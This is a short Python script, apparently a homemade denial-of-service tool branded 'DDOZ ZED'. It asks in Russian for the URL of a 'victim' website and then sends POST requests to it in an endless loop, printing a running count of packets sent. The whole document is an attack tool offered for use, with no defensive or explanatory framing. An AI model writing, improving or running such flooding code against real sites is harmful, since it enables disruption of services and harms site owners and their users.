from pyfiglet import Figlet
import requests


def main():
  n = 0
  preview_text = Figlet(font='slant')
  print(preview_text.renderText('DDOZ ZED'))

  data = 'a'
  url = input("Введите ссылку на сайт который является жертвой: ")
  print("Нажмите Ctrl + C для завершения ппрограммы!")
  while True:
    response = requests.post(url, data=data)
    n += 1
    response.status_code
    print(f"{n} пакетов отправлено")


if __name__ == "__main__":
  main()
 

